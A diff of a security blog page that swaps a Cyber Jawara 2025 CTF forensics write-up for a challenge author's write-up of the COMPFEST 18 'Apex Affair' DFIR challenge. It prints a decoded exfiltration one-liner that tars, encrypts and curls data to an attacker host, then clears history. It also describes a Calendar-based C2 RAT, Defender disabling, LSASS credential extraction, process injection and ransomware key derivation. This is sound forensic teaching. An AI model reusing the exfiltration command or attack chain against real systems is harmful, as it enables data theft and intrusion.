@@ -6,9 +6,9 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="description" content="A personal technical blog documenting my journey as a Computer Science student, covering cybersecurity, CTF write-ups, digital forensics, reverse engineering, and hands-on security research.
 ">
-  <link rel="canonical" href="http://localhost:4000/CyberJawara2025-Unorthodox-Part-1/">
+  <link rel="canonical" href="http://localhost:4000/Compfest18Qual-TheApexAffair/">
   <
-  <title>Unorthodox Part 1 – Cyber Jawara Qual 2025 | Jaysen Lestari</title>
+  <title>The Apex Affair - Compfest18 Qualification | Jaysen Lestari</title>
   
   <link rel="icon" type="image/png" href="/assets/img/avatar.png">
   <link rel="stylesheet" href="/assets/main.css">
@@ -79,256 +79,308 @@
   <div class="post-shell">
     <div class="post-main">
       <p class="post-meta-line">
-        <span>Jan 17, 2026</span>
+        <span>Aug 29, 2026</span>
         
         <span class="dot" aria-hidden="true">&bull;</span>
-        <span class="caps">CTF | Forensics | DFIR</span>
+        <span class="caps">Forensics | Malware Analysis | Disk Forensics | Memory Forensics | LOTS</span>
         
       </p>
 
-      <h1 class="post-title">Unorthodox Part 1 – Cyber Jawara Qual 2025</h1>
+      <h1 class="post-title">The Apex Affair - Compfest18 Qualification</h1>
 
       
       <div class="tag-row">
         
-        <span class="tag-chip">DigitalForensics</span>
+        <span class="tag-chip">DFIR</span>
+        
+        <span class="tag-chip">MalwareAnalysis</span>
+        
+        <span class="tag-chip">MemoryForensics</span>
         
         <span class="tag-chip">DiskForensics</span>
         
-        <span class="tag-chip">Linux</span>
+        <span class="tag-chip">ReverseEngineering</span>
         
-        <span class="tag-chip">xattr</span>
+        <span class="tag-chip">LOTS</span>
         
-        <span class="tag-chip">Persistence</span>
+        <span class="tag-chip">GoogleCalendar</span>
         
-        <span class="tag-chip">PCAP</span>
+        <span class="tag-chip">DPAPI</span>
+        
+        <span class="tag-chip">MemProcFS</span>
+        
+        <span class="tag-chip">ProcessInjection</span>
+        
+        <span class="tag-chip">Ransomware</span>
+        
+        <span class="tag-chip">Ethereum</span>
+        
+        <span class="tag-chip">SmartContract</span>
         
       </div>
       
 
       <div class="post-body">
-        <p>On December 27th, I participated in the Cyber Jawara 2025 Qualifiers with my team, manablokchennya-Xx and we qualified to the final stage, where one of the forensic challenges I manage to solved was “Unorthodox - Part 1.”.</p>
+        <p>So, in this post I will explain the forensic challenge I created for COMPFEST 18. The challenge focuses on how an attacker abuses LOTS (Living Off Trusted Sites) as a command-and-control channel. The idea was inspired by the Spotify as C2 <a href="https://john-woodman.com/research/spotifyc2/">research</a>, which led me to explore how Google Calendar could be abused in a similar way.</p>
 
-<p>Unorthodox – Part 1 stood out as a particularly interesting challenge due to its realistic investigation flow, especially in the later stage where the attacker leveraged <strong>less common persistence techniques</strong>. Instead of relying on obvious indicators of compromise, the challenge required careful review of package installation logs and extended file attributes to uncover a stealthy payload hidden using <strong>xattr</strong>, which was planted months before the actual data exfiltration took place.</p>
+<p><img src="/assets/apex-affair/attack_graf.png" alt="alt text" />
+The graph above summarizes the complete two-day attack chain. Throughout this writeup, I will follow the same flow from the initial phishing email, through payload execution and Google Calendar-based C2, to the attacker’s activity on the second day and the final ransomware execution.</p>
 
-<p>In this post, I will present a complete forensic write-up of the challenge, detailing each step of the investigation — from mounting the compromised virtual machine and validating credential integrity, to uncovering hidden persistence mechanisms, decrypting exfiltrated data, and identifying multiple internal threat actors operating within the environment.</p>
+<h2 id="initial-access-and-phishing-recovery">Initial Access and Phishing Recovery</h2>
 
-<p>You can access the challange attachments <a href="https://github.com/sksd-id/CJ2025-public/tree/main/quals/umum/Forensics/Unorthodox%20Part%201">here</a></p>
+<p>Before the attacker could establish this Google Calendar-based C2 channel, they first needed to gain access to the victim’s workstation. The incident began with a phishing email sent by the attacker, who impersonated one of the victim company’s trusted vendors. The email was received by the victim through Microsoft Outlook and delivered a link to an MSI disguised as a legitimate Google Chrome installer.</p>
 
-<h2 id="unorthodox-part-1">Unorthodox Part 1</h2>
+<p>So, the first thing to understand is how the email itself can be recovered from the disk image. Older versions of Outlook commonly stored mailbox data in OST or PST files (src: https://www.sherlockforensics.com/blog/email-forensics-toolkit-pst-ost-msg-eml.html), but the new Outlook client relies heavily on Chromium-based components and keeps much of its cached data inside <code class="language-plaintext highlighter-rouge">IndexedDB</code>, located under the <code class="language-plaintext highlighter-rouge">Olk\EBWebView</code> directory (src: https://learn.microsoft.com/en-us/answers/questions/1479356/new-outlook-data-files). By parsing the LevelDB records inside this database, we can reconstruct the phishing email and recover useful artifacts such as the sender, subject, timestamp, and attachment information. From there, the investigation can follow the attack graph by tracing the recovered attachment on disk, identifying its execution, and continuing into the DLL and subsequent payloads dropped by the installer.</p>
 
-<h3 id="attachment">Attachment</h3>
-<ul>
-  <li>artifact.zip</li>
-</ul>
+<p>After recovering the phishing email, the next step is to follow the malicious attachment and determine what happened after it was executed. The attachment was an MSI package, so instead of treating it as a normal installer, we can inspect its internal tables and custom actions to identify the embedded payload (src: https://intezer.com/blog/how-to-analyze-malicious-msi-installer-files). From there, the execution chain leads to a malicious DLL, <code class="language-plaintext highlighter-rouge">chrome_update.dll</code>, which is launched through rundll32.exe.</p>
 
-<h3 id="description">Description</h3>
-<p>Our client has suffered a critical internal breach. All the details can be found in CJ-UNORTHODOX-CASE-1.pdf file. You need to answer all the tasks correctly in the remote connection. There are 8 Questions for you to answer. All of the necessary artifacts including the document can be downloaded from the following zip file: https://drive.google.com/file/d/1rJk2hWxTV8jGLkAOdKPGAyBHPxNB67a2/view?usp=sharing 
-Zip password = CJ2025{65e8d2d5563d202ff4d6269e08748f9e24854eb6374670851fe1542ebecf739c}</p>
+<h2 id="defense-evasion-and-persistence">Defense Evasion and Persistence</h2>
 
-<p>NOTE: The malicious artifact doesn’t encrypt/modify your files, don’t worry. You can trust me ^-^ Start challenge from: https://gzcli.ctf.cyberjawara.id/umum-quals-forensics-unorthodox-part-1</p>
+<p>The DLL then becomes the next pivot point in the investigation. By correlating file creation and process creation artifacts, we can see that it creates a Defender exclusion and deploys two additional binaries: <code class="language-plaintext highlighter-rouge">GoogleUpdater.exe</code> and <code class="language-plaintext highlighter-rouge">software_reporter_tool.exe</code>. <code class="language-plaintext highlighter-rouge">GoogleUpdater.exe</code> is executed first and uses functionality from the open-source <a href="https://github.com/wesmar/kvc/">kvc framework</a> to disable the Windows security engine and turn off Tamper Protection and Real-Time Protection.</p>
 
-<h3 id="initial-case-analysis">Initial Case Analysis</h3>
-<p>This case provided four files :</p>
-<ul>
-  <li>CJ-UNORTHODOX-CASE-1.pdf</li>
-  <li>PCAP_Captured.pcap</li>
-  <li>CoreStock.ova</li>
-  <li>exfiltrated.bin</li>
-</ul>
+<p>Under the hood, kvc secengine disable targets several Defender-related components using Image File Execution Options (IFEO) interception together with a vulnerable-driver-assisted process termination mechanism, allowing the security engine to be shut down without requiring a reboot. The full implementation is documented in the project’s README, so I will not go too deeply into it here.</p>
 
-<p>From the PDF, we learn that the attacker caused three main impacts:</p>
-<ol>
-  <li>All recent stock macro-analysis data was deleted</li>
-  <li>All user login credentials were changed</li>
-  <li>The server may have been compromised by multiple internal threat actors</li>
-</ol>
+<h2 id="google-calendar-as-command-and-control">Google Calendar as Command and Control</h2>
 
-<p>Since the virtual machine might still contain useful evidence, I started by analyzing the <code class="language-plaintext highlighter-rouge">CoreStock.ova</code> file.</p>
+<p><code class="language-plaintext highlighter-rouge">software_reporter_tool.exe</code> was then configured to persist through the Windows Run Registry, allowing the RAT to start again whenever the user logged in. Once persistence was established, <code class="language-plaintext highlighter-rouge">software_reporter_tool.exe</code> began communicating with <code class="language-plaintext highlighter-rouge">Google Calendar</code>, which was abused as a Living Off Trusted Sites (LOTS) command-and-control channel. Instead of contacting a dedicated C2 server, the RAT periodically queried calendar events and used specific event fields to exchange data with the attacker. The Summary field was used to identify the compromised host, while the Description field stored the command and its execution result. By reconstructing this behavior, we can then pivot to process creation artifacts and trace the commands that were actually executed through the RAT.</p>
 
-<h3 id="mounting-the-compromised-virtual-machine">Mounting the Compromised Virtual Machine</h3>
-<p>An OVA is basically a packaged virtual machine, so I extracted it and obtained the main disk file: <code class="language-plaintext highlighter-rouge">CoreStock-disk002.vmdk</code>. To mount this VMDK and access the filesystem, I followed the method described <a href="https://jasonmurray.org/posts/2021/mountvmdk/">here</a>.</p>
-<ol>
-  <li>Load the NBD kernel module
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>modprobe nbd <span class="nv">max_part</span><span class="o">=</span>8
-</code></pre></div>    </div>
-  </li>
-  <li>Attach the VMDK to /dev/nbd0 (read-only)
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>qemu-nbd <span class="nt">--read-only</span> <span class="nt">--connect</span><span class="o">=</span>/dev/nbd0 CoreStock-disk002.vmdk
-</code></pre></div>    </div>
-  </li>
-  <li>Check the partition layout
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>fdisk <span class="nt">-l</span> /dev/nbd0
-</code></pre></div>    </div>
-    <p><img src="/assets/CJ-Qual/1.png" alt="alt text" />
-From this output I identified:</p>
-    <ul>
-      <li>/dev/nbd0p2 → ext4 partition (~2GB) → this is the /boot partition</li>
-      <li>/dev/nbd0p3 → LVM physical volume (~23GB) → this contains the main OS filesystem
-So the actual Linux system is stored inside LVM on partition p3.</li>
-    </ul>
-  </li>
-  <li>Detect and activate the LVM volumes
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pvscan
-<span class="nb">sudo </span>vgscan
-<span class="nb">sudo </span>vgchange <span class="nt">-ay</span>
-<span class="nb">sudo </span>lvs
-</code></pre></div>    </div>
-    <p>This revealed a logical volume: /dev/ubuntu-vg/ubuntu-lv</p>
-  </li>
-  <li>Mount the root filesystem (read-only)
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>mount <span class="nt">-o</span> ro,noload /dev/ubuntu-vg/ubuntu-lv /mnt/un
-</code></pre></div>    </div>
-    <p>Using ro,noload ensures the filesystem journal is not replayed, so nothing on disk is modified. At this point, the full Linux filesystem became accessible at: /mnt/un	
-<img src="/assets/CJ-Qual/2.png" alt="alt text" /></p>
-  </li>
-</ol>
+<p>From there, the investigation can move from understanding how the C2 works to reconstructing what the attacker actually executed through it. Since normal commands received from Google Calendar were passed to <code class="language-plaintext highlighter-rouge">cmd.exe</code>, process creation artifacts can be used to rebuild the attacker’s command history and follow the intrusion chronologically.</p>
 
-<h3 id="question-and-analysis">Question and Analysis</h3>
-<p>Now we move on to the question.</p>
-<ol>
-  <li>Provide the current state SHA1 checksum of /etc/passwd and /etc/shadow files respectively.
-Format: hexpasswd:hexshadow (e.g., 01cde86aeee1f8e73f969bb34b8e0102b54f22f4:80514ef77a78c1edb97cf51a205627b2d6ec679d)
-We calculated the SHA1 checksum of both files directly from the mounted filesystem:
-<img src="/assets/CJ-Qual/3.png" alt="alt text" /></li>
-</ol>
+<p>The first attacker-issued reconnaissance command was systeminfo. On the following day, the RAT resumed communication and the attacker continued enumerating the compromised workstation, including its running processes.</p>
 
-<p>Answer : 
-<code class="language-plaintext highlighter-rouge">b4e536869564e1b32dfd60ea90bc45227a289c3c:e9b3129a2209be30fb0ba6ceb61e5c0ee4e47c70</code></p>
+<h2 id="zoom-forensics-and-dpapi-recovery">Zoom Forensics and DPAPI Recovery</h2>
 
-<ol>
-  <li>What’s the IP address of the internal threat actor (local) who’s responsible to exfiltrate a certain data to their controlled website/API endpoint? 
-Format: ipv4.ipv4.ipv4.ipv4 (e.g., 172.16.1.78)
-We analyzed the provided packet capture and inspected HTTP traffic. One suspicious HTTP POST request contained:
-    <ul>
-      <li>User-Agent: curl</li>
-      <li>Message Body: Berhasil :p</li>
-    </ul>
-  </li>
-</ol>
+<p>One of the applications observed during this enumeration was Zoom, which was actively being used by the victim during the second day of the incident. This became an interesting forensic pivot because the victim had attended a Zoom meeting shortly before the attacker continued their activity. After the meeting ended, the attacker performed additional reconnaissance and discovered a newly created document inside the victim’s confidential working directory under <code class="language-plaintext highlighter-rouge">Documents\Finance\Executive</code>. This suggested that something that occurred during or around the meeting had introduced a new file into the victim’s workflow, making the local Zoom artifacts worth investigating before continuing further along the attack timeline.</p>
 
-<p>This strongly suggested command-line exfiltration activity.
-<img src="/assets/CJ-Qual/5.png" alt="alt text" /></p>
+<p>Zoom stores several local artifacts under the user’s application data directory, but some of its databases and sensitive values are encrypted. I based this part of the challenge on the approach described in this <a href="https://infosecwriteups.com/decrypting-zoom-team-chat-forensic-analysis-of-encrypted-chat-databases-394d5c471e60">Zoom Team Chat forensic analysis</a>, which explains how Zoom protects its local data and how its database encryption key can be recovered.</p>
 
-<p>Answer : <code class="language-plaintext highlighter-rouge">192.168.100.107</code></p>
+<p>One of the important artifacts is <code class="language-plaintext highlighter-rouge">win_osencrypt_key</code> inside <code class="language-plaintext highlighter-rouge">Zoom.us.ini</code>. The value contains a ZWOSKEY prefix followed by a Base64-encoded DPAPI-protected blob, meaning that the Zoom database key cannot simply be recovered by reading the configuration file directly. To decrypt it, we first need the DPAPI master key associated with the victim’s Windows profile.</p>
 
-<ol>
-  <li>What’s the path of the attacker controlled endpoint that receives the data? Note that the data doesn’t exist in the packet capture, but we’ve dissected and extracted it to the exfiltrated.bin file.
-Format: /path (e.g., /exfiltratedapi)
-A malicious script was discovered at: /home/cj/.ssh/rc.</li>
-</ol>
+<p>The approach described in the original research recovers the DPAPI master key using the victim’s Windows password. For this challenge, however, I intentionally made that route impractical by using a password that was not reasonably crackable. Fortunately, DPAPI material may still remain in the memory of <code class="language-plaintext highlighter-rouge">lsass.exe</code> while the user’s session is active, which provides another recovery path.</p>
 
-<p>When opening the file, it did not immediately show readable code. Instead, it contained Base64-encoded and obfuscated shell syntax, for example:
-<img src="/assets/CJ-Qual/6.png" alt="alt text" />
-Breaking down the obfuscation :</p>
+<h3 id="breaking-the-easy-volatility-path">Breaking the Easy Volatility Path</h3>
+
+<p>Normally, this could be solved rather quickly using the <a href="https://github.com/skelsec/pypykatz-volatility3">pypykatz-volatility3 plugin</a>, which is capable of extracting DPAPI-related material directly from LSASS through Volatility 3. However, another forensic challenge in COMPFEST 18, developed by Karev, already relied on a similar Volatility-based memory analysis workflow. I wanted this challenge to require a different approach rather than having participants solve another memory objective using essentially the same toolchain.</p>
+
+<p>The idea for this came from <a href="https://keii.malwr.es/posts/volatility-vs-windows-sandbox/">Keii’s blog</a>, particularly a WreckIT 6.0 forensic challenge that he created where Volatility was unable to properly analyze the provided Windows memory image, while MemProcFS could still work with it. That gave me the idea of introducing a similar limitation into this challenge without actually destroying the useful memory contents.</p>
+
+<p>Instead of broadly corrupting the dump, I modified a paging-related structure inside the system’s PML4. Volatility 3 relies on several heuristics during its Windows memory bootstrap process to discover the Directory Table Base and construct the virtual-memory translation layer. By invalidating the self-referencing PML4 entry used during this discovery process, Volatility could still recognize the memory image itself, but it could no longer automatically construct the Windows paging layer required by most of its plugins.</p>
+
+<p>The important part was that the dump itself remained largely intact. Process memory, credential material, and other forensic artifacts were still present. Only one of the paging invariants used by Volatility’s automatic DTB discovery had been intentionally broken.</p>
+
+<h3 id="recovering-lsass-with-memprocfs">Recovering LSASS with MemProcFS</h3>
+
+<p>MemProcFS, however, uses a different approach for Windows memory initialization and was still able to analyze the modified image. This made it the intended alternative path for recovering the LSASS process.</p>
+
+<p>There was one more problem. Recent versions of MemProcFS no longer exposed the LSASS MiniDump in the same way required for this approach. Initially, I thought this recovery method was no longer possible, until I found <a href="https://github.com/ufrisk/MemProcFS/issues/175">MemProcFS issue</a>, which showed that the functionality had existed in earlier releases.</p>
+
+<p>That meant the solution was not to find another completely different technique, but rather to identify an older MemProcFS release that still supported the required process dump functionality. I eventually used <strong>MemProcFS v5.7</strong>, which was able to expose the LSASS MiniDump successfully.</p>
+
+<p>From there, the recovery path becomes straightforward, you could use pypykatz to retrieve the DPAPI master key. That key could then be used to decrypt Zoom’s win_osencrypt_key, giving us the encryption key required to access the local Zoom databases.</p>
+
+<p>After recovering the key and decrypting the Zoom databases, there was one small twist: the specific message I originally expected participants to recover was not actually retained in the local database 😭.</p>
+
+<p>From a realistic incident, that message would have helped explain that a new confidential document had been introduced during the meeting, which would naturally connect the Zoom activity to the file later discovered by the attacker. In practice, however, the challenge questions did not depend on recovering that exact message, so the forensic objective still worked without it.</p>
+
+<p>The important part of this section was the recovery chain itself, identifying Zoom as a forensic pivot, understanding its encrypted local storage, recovering DPAPI material from LSASS, and finally decrypting the application’s local data. Once that was complete, the investigation could return to the attacker’s C2 timeline, where the next stage became significantly more malicious which was process injection.</p>
+
+<h2 id="process-injection-and-payload-recovery">Process Injection and Payload Recovery</h2>
+
+<p>From there, the investigation returns to the RAT’s execution flow. Unlike the previous reconnaissance commands, which were passed to cmd.exe, the RAT contained a separate handler for commands beginning with inject. When such a command was received, the RAT downloaded the supplied payload directly into memory, searched for a running notepad.exe process (which the attacker knew was running from earlier process enumeration), allocated executable memory inside it, copied the payload into that region, and finally started a new thread using CreateRemoteThread.</p>
+
+<p>This behavior could be confirmed from Sysmon Event ID 8, which recorded the remote thread creation from <code class="language-plaintext highlighter-rouge">software_reporter_tool.exe</code> into <code class="language-plaintext highlighter-rouge">notepad.exe</code>. At that point, the next objective was no longer just identifying the injection itself, but recovering the actual payload that had been placed inside the target process.</p>
+
+<h3 id="recovering-the-injected-payload">Recovering the Injected Payload</h3>
+
+<p>Recovering the injected payload turned out to be more difficult than I initially expected. My first assumption was that the HTTP transfer used during the inject command could simply be recovered from the memory image using bulk_extractor, since the RAT downloaded the payload directly over the network before injecting it into notepad.exe.</p>
+
+<p>However, the recovered HTTP data was incomplete and the payload could not be reconstructed cleanly from that source. After the injection, the system continued executing the ransomware, encrypting files, spawning additional processes, and receiving more commands from the attacker, all of which could have caused the relevant memory regions to change.</p>
+
+<p>That failure actually made this part of the challenge more interesting, because there was still another seemingly obvious recovery path, dumping the injected memory region directly from the target <code class="language-plaintext highlighter-rouge">notepad.exe</code> process. Since Sysmon had already revealed the remote thread creation and its start address, the injected region should theoretically have been recoverable from the process memory.</p>
+
+<p>Unfortunately, that path failed as well. The targeted Notepad process had already terminated before the memory image was acquired, so its original virtual-memory mappings were no longer reliable enough to recover the injected region cleanly. At that point, the next place to look was the RAT itself. Since <code class="language-plaintext highlighter-rouge">software_reporter_tool.exe</code> had downloaded the complete payload into its own address space before copying it into Notepad, another copy of the shellcode could still remain there.</p>
+
+<p>Using MemProcFS, I navigated to the RAT process and used its generated MiniDump as the recovery source. The partial HTTP stream from bulk extractor was still useful here because it revealed two important pieces of information, the first bytes of the payload and the expected Content-Length. Those values could be used as a signature and size constraint to search through the MiniDump for candidate regions that matched the original download.</p>
+
+<p>After carving the matching region, the recovered payload could be validated with Detect It Easy, which identified it as Donut-generated shellcode. From there, the Donut layer could be unpacked to recover the embedded 64-bit Windows executable, which turned out to be the ransomware used in the final stage of the incident.</p>
+
+<h2 id="ransomware-and-blockchain-based-configuration">Ransomware and Blockchain-Based Configuration</h2>
+
+<p>By extracting the embedded executable from the Donut shellcode, the final payload could be analyzed directly. Unlike the RAT, which used Google Calendar to receive commands, the ransomware used the Ethereum Sepolia network to retrieve its victim-specific encryption configuration.</p>
+
+<p>The ransomware first generates a unique victim identifier by concatenating the system <strong>hostname, MAC address, and MachineGuid</strong>, then hashing the result with SHA-256. That victim ID is used as the key when querying the attacker’s smart contract.</p>
+
+<p>The contract itself stores a per-victim structure containing an <strong>encryptedSeed, salt, kdfRounds, and an active flag</strong>, while values such as the ransomware extension and ransom note are stored globally. The malware queries this state through an eth_call request to the Sepolia RPC endpoint and supplies the victim ID as the function argument.</p>
+
+<p>From the ransomware code, the RPC request is sent to <a href="https://eth-sepolia.blockscout.com/address/0x08FE9fc8288Cf5D5EE5f4F69c0e4f774FFA275d4?tab=index">ethereum-sepolia-rpc.publicnode.com</a>, targeting the attacker’s deployed smart contract. The calldata consists of the function selector followed by the 32-byte victim ID. The malware then parses the returned ABI-encoded data into the victim’s encrypted seed, salt, KDF round count, active state, file extension, and ransom note.</p>
+
+<p>This is where the challenge questions about the smart contract address, function selector, and the returned encrypted seed, salt, and KDF rounds naturally come from. Rather than embedding the final encryption material directly inside the malware, the payload only contains the logic required to identify the victim and retrieve the corresponding configuration from the blockchain.</p>
+
+<h3 id="encryption-and-key-derivation">Encryption and Key Derivation</h3>
+
+<p>The value returned as encryptedSeed is not used directly as the AES key. The ransomware first derives a mask from <code class="language-plaintext highlighter-rouge">SHA256(victimID || salt)</code> and XORs that mask with the encrypted seed to recover the internal master secret.</p>
+
+<p>That master secret is then used as the key for an iterative HMAC-SHA256 derivation. The initial input is based on the victim’s MachineGuid and the salt returned by the smart contract. After the configured number of KDF rounds, the first 16 bytes of the result become the AES key.</p>
+
+<p>The IV is derived separately using HMAC-SHA256 over the exact path of the targeted file. This detail is important because it makes the original file path part of the cryptographic recovery process; even if the other key material is correct, using the wrong path would produce a different IV.</p>
+
+<p>The ransomware specifically targets the document that appeared earlier in the incident timeline: <strong>C:\Users\edwar\OneDrive\Documents\Workspace\Finance\Executive\Apex_Orion_Acquisition_Proposal.docx</strong>.</p>
+
+<h3 id="encrypting-the-confidential-document">Encrypting the Confidential Document</h3>
+
+<p>After deriving the AES key and IV, the file is encrypted using AES in CBC mode with block padding. The encrypted copy is written using the extension returned by the smart contract, which in this case is the global .jay extension, and the original document is deleted.</p>
+
+<p>The ransomware also creates a <code class="language-plaintext highlighter-rouge">README.txt ransom note</code> in the same <code class="language-plaintext highlighter-rouge">Finance\Executive</code> directory. The note content is fetched from the smart contract and dynamically updated with the victim ID before being written to disk.</p>
+
+<h2 id="recovering-the-original-document">Recovering the Original Document</h2>
+
+<p>At this point, the attack chain had been fully reconstructed, but the forensic objective was not complete yet. The final step was to reverse the ransomware’s key derivation process and recover the original confidential document.</p>
+
+<p>From the previous analysis, we already know the victim-specific configuration returned by the smart contract, including the encrypted seed, salt, and KDF round count. The remaining values required for recovery are the victim’s <code class="language-plaintext highlighter-rouge">MachineGuid</code> and the exact original file path, both of which are used by the ransomware during key and IV derivation.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">MachineGuid</code> can be recovered from the Windows registry, while the original path can be reconstructed from the filesystem artifacts. With those values, the same derivation routine used by the ransomware can be reproduced: recover the master secret from the encrypted seed, derive the AES key through the configured HMAC-SHA256 rounds, and derive the IV from the original file path.</p>
+
+<p>Using the reconstructed key and IV, the <code class="language-plaintext highlighter-rouge">.jay</code> file can finally be decrypted back into the original <code class="language-plaintext highlighter-rouge">Apex_Orion_Acquisition_Proposal.docx</code>. Verifying the recovered document and its hash confirms that the original file was successfully restored.</p>
+
+<p>And with that, the full incident comes together: what started as a phishing email eventually led to a Google Calendar-based RAT, attacker reconnaissance, process injection, and a ransomware payload backed by an Ethereum smart contract.</p>
+
+<h2 id="ioc">IOC</h2>
+
+<h3 id="phishing">Phishing</h3>
 
 <table>
   <thead>
     <tr>
-      <th>Obfuscated Part</th>
-      <th>Explanation</th>
+      <th>Type</th>
+      <th>Indicator</th>
     </tr>
   </thead>
   <tbody>
     <tr>
-      <td><code class="language-plaintext highlighter-rouge">$'\u0073'</code></td>
-      <td>Unicode escape sequence representing the character <code class="language-plaintext highlighter-rouge">s</code></td>
+      <td>Sender</td>
+      <td><code class="language-plaintext highlighter-rouge">tech.cloudaxls@gmail.com</code></td>
     </tr>
     <tr>
-      <td><code class="language-plaintext highlighter-rouge">ba$'\u0073h'</code></td>
-      <td>Reconstructed at runtime to form the string <code class="language-plaintext highlighter-rouge">bash</code></td>
+      <td>Reply-To Domain</td>
+      <td><code class="language-plaintext highlighter-rouge">cloudaxls-tech.com</code></td>
     </tr>
     <tr>
-      <td><code class="language-plaintext highlighter-rouge">${@,}</code> &amp; <code class="language-plaintext highlighter-rouge">${@%%…}</code></td>
-      <td>Dummy parameter expansions used to confuse analysis</td>
+      <td>Malicious URL</td>
+      <td><code class="language-plaintext highlighter-rouge">http://192.168.56.1/googlechromestandaloneenterprise64.msi</code></td>
     </tr>
     <tr>
-      <td><code class="language-plaintext highlighter-rouge">&lt;&lt;&lt;</code></td>
-      <td>Here-string redirection for inline input</td>
+      <td>MSI SHA-256</td>
+      <td><code class="language-plaintext highlighter-rouge">3c1e30040500f4bb55fbd669544949863557b8f7b25bdbce4a9d4ba6cb3264e4</code></td>
     </tr>
   </tbody>
 </table>
 
-<p>So we know : it run bash and feeds decoded base64 into it. To inspect the actual malicious command safely,
-we replaced the execution part with cat instead of bash
-<img src="/assets/CJ-Qual/7.png" alt="alt text" />
-<img src="/assets/CJ-Qual/8.png" alt="alt text" />
-This revealed the FULL malicious script:</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"Haha your server is already pwned by Joko_S3mbunG."</span> |  <span class="nb">tar</span> <span class="nt">-czf</span> - <span class="nt">-C</span> /home/cj/core_app <span class="nb">.</span> | openssl enc <span class="nt">-aes-256-cbc</span> <span class="nt">-salt</span> <span class="nt">-pbkdf2</span> <span class="nt">-k</span> <span class="s1">'Ch4LLG48uT_h3h3!'</span> | curl <span class="nt">-X</span> POST <span class="nt">--data-binary</span> @- http://192.168.100.107/looters <span class="o">&amp;&amp;</span> <span class="nb">history</span> <span class="nt">-c</span>
-</code></pre></div></div>
-<p>So, we know that the data flow is : 
-/home/cj/core_app  -&gt;  tar  -&gt;  openssl encryption  -&gt;  curl POST  -&gt;  attacker server</p>
+<h3 id="malicious-files">Malicious Files</h3>
 
-<p>Answer : <code class="language-plaintext highlighter-rouge">looters</code></p>
+<table>
+  <thead>
+    <tr>
+      <th>Type</th>
+      <th>Indicator</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Dropped DLL</td>
+      <td><code class="language-plaintext highlighter-rouge">C:\Users\Public\chrome_update.dll</code></td>
+    </tr>
+    <tr>
+      <td>Defender Tool</td>
+      <td><code class="language-plaintext highlighter-rouge">C:\Program Files\Google\Chrome\GoogleUpdater.exe</code></td>
+    </tr>
+    <tr>
+      <td>GoogleUpdater.exe SHA-256</td>
+      <td><code class="language-plaintext highlighter-rouge">192f65c45f72d1221c9c95158fa97093348c620428f2a22b53d4a7f6b67dcb17</code></td>
+    </tr>
+    <tr>
+      <td>RAT</td>
+      <td><code class="language-plaintext highlighter-rouge">C:\Program Files\Google\Chrome\software_reporter_tool.exe</code></td>
+    </tr>
+    <tr>
+      <td>RAT SHA-256</td>
+      <td><code class="language-plaintext highlighter-rouge">520a4c0a8d1349ab9e5c8bc98832198dac2680345ad6e038e172102138a1f79c</code></td>
+    </tr>
+    <tr>
+      <td>Injected Shellcode SHA-256</td>
+      <td><code class="language-plaintext highlighter-rouge">9e2413e4d0469a25c7840872f5fa98d93c4bb1c2f9a0d184f47eadaf808fefcf</code></td>
+    </tr>
+    <tr>
+      <td>Ransomware SHA-256</td>
+      <td><code class="language-plaintext highlighter-rouge">7651bb07c5cc826c04f70ded7f20460710bddeb23aa24963d637284cb924394c</code></td>
+    </tr>
+  </tbody>
+</table>
 
-<ol>
-  <li>What’s the full absolute path of the targeted directory that the internal threat actor exfiltrates from?
-Format: /absolute/path (e.g., /opt/secret)</li>
-</ol>
+<h3 id="persistence-and-c2">Persistence and C2</h3>
 
-<p>From the malicious script we recovered in /home/cj/.ssh/rc. We previously decoded the payload and discovered the following command chain: tar -czf - -C /home/cj/core_app .</p>
+<table>
+  <thead>
+    <tr>
+      <th>Type</th>
+      <th>Indicator</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Run Key</td>
+      <td><code class="language-plaintext highlighter-rouge">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\software_reporter_tool</code></td>
+    </tr>
+    <tr>
+      <td>C2 Service</td>
+      <td><code class="language-plaintext highlighter-rouge">Google Calendar</code></td>
+    </tr>
+    <tr>
+      <td>Google API Host</td>
+      <td><code class="language-plaintext highlighter-rouge">www.googleapis.com</code></td>
+    </tr>
+    <tr>
+      <td>Payload Source</td>
+      <td><code class="language-plaintext highlighter-rouge">192.168.56.1:80</code></td>
+    </tr>
+    <tr>
+      <td>Payload Path</td>
+      <td><code class="language-plaintext highlighter-rouge">/patch.bin</code></td>
+    </tr>
+  </tbody>
+</table>
 
-<p>Answer: <code class="language-plaintext highlighter-rouge">/home/cj/core_app</code></p>
+<h3 id="ransomware-infrastructure">Ransomware Infrastructure</h3>
 
-<ol>
-  <li>Where is the malicious exfiltrator script located? Please provide the full absolute path!
-During inspection of the compromised user account directory /home/cj/.ssh, we discovered rc, the file contains malicious encoded payload.</li>
-</ol>
-
-<p>Answer : <code class="language-plaintext highlighter-rouge">/home/cj/.ssh/rc</code></p>
-
-<ol>
-  <li>It looks like the exfiltrated directory files were all being shredded. Please provide the original metadata title of the web application (in layout.tsx file), the total of the stock sectors and the total of the companies!
-Format: Title Web App Name_totalstocksectors_totalcompanies (e.g., Cool Stock Website 2024 - Galapagos Stock_8_91)
-First, we extracting the exfiltrated encrypted payload and decrypting using the attacker’s AES key : Ch4LLG48uT_h3h3! and than extracting the web app source code
-    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tar</span> <span class="nt">-czf</span> - <span class="nt">-C</span> /home/cj/core_app <span class="nb">.</span>
-| openssl enc <span class="nt">-aes-256-cbc</span> <span class="nt">-salt</span> <span class="nt">-pbkdf2</span> <span class="nt">-k</span> <span class="s1">'Ch4LLG48uT_h3h3!'</span>
-</code></pre></div>    </div>
